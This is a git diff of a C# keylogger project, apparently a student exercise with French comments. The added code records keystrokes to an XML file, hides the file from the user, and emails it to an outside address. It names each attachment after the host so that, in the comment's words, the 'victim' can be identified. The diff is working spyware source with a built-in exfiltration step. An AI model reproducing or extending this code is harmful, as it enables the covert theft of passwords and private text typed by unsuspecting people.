@@ -35,7 +35,7 @@ namespace ProjetKeyLogger
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
-            file_path = "../../../Fichier XML/TestXML.xml";
+            file_path = "TestXML.xml";
 
         }
 
@@ -81,12 +81,32 @@ namespace ProjetKeyLogger
 
                             //Si touche Entrée
                             case 13:
-                                //Sinon on peut faire un console.writeline tout simplement ?
                                 //On ajoute l'enregistrement a la collection
                                 collection_enregistrement.ajouterNew(enregistrement);
 
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
+
+                                //SI le nombre de caractere tapé a dépassé la limite
+                                if (nb_caractere_tape > 100)
+                                {
+                                    //On enregistre le contenue en xml
+                                    collection_enregistrement.saveToXml(file_path);
+
+                                    //on cache le xml
+                                    File.SetAttributes(file_path, FileAttributes.Hidden);
+                                    //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
+                                    
+                                    //On reinitialise le nombre de caracteres
+                                    nb_caractere_tape = 0;
+
+                                    //On réinitialise la collection
+                                    collection_enregistrement = new CollectionEnregistrement();
+
+                                    //envoie du mail
+                                    envoieMail();
+                                }
+                                
                                 break;
 
                             case 16:
@@ -331,31 +351,14 @@ namespace ProjetKeyLogger
                                 
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                 enregistrement.ajouterContenu((char)codeASCII);
-                                //Sinon on incrémente le nombre de caracteres tapé
+                                //On incrémente le nombre de caracteres tapé
+                                //!!!A mettre a chaque fois qu'un caractere est tapé!!!
                                 nb_caractere_tape += 1;
                                 break;
                         }
 
                     }
-                    if (nb_caractere_tape > 20)
-                    {
-                        //On enregistre le contenue en xml
-                        collection_enregistrement.saveToXml(file_path);
-
-                        //on cache le xml
-                        //File.SetAttributes(file_path, FileAttributes.Hidden);
-                        //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
-
-
-                        //On reinitialise le nombre de caracteres
-                        nb_caractere_tape = 0;
-
-                        //On réinitialise la collection
-                        collection_enregistrement = new CollectionEnregistrement();
-
-                        //envoie du mail
-                        envoieMail();
-                    }
+                   
                 }
 
             }
@@ -393,7 +396,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            Message_Mail.To.Add("jejarer632@nonicamy.com");
+            Message_Mail.To.Add("ccamenen@outlook.fr");
 
             //defition de l'objet du mail
             Message_Mail.Subject = Objet_Mail;
@@ -411,7 +414,7 @@ namespace ProjetKeyLogger
             Message_Mail.Body = Corps_Mail;
 
             //Ajout de la pièce jointe
-            System.Net.Mail.Attachment pieceJointe = new System.Net.Mail.Attachment(Chemin_Txt);
+            System.Net.Mail.Attachment pieceJointe = new System.Net.Mail.Attachment(file_path);
             //On renomme le fichier pour pouvoir identifier notre victime
             pieceJointe.Name = Dns.GetHostName() + ".xml";
             Message_Mail.Attachments.Add(pieceJointe);
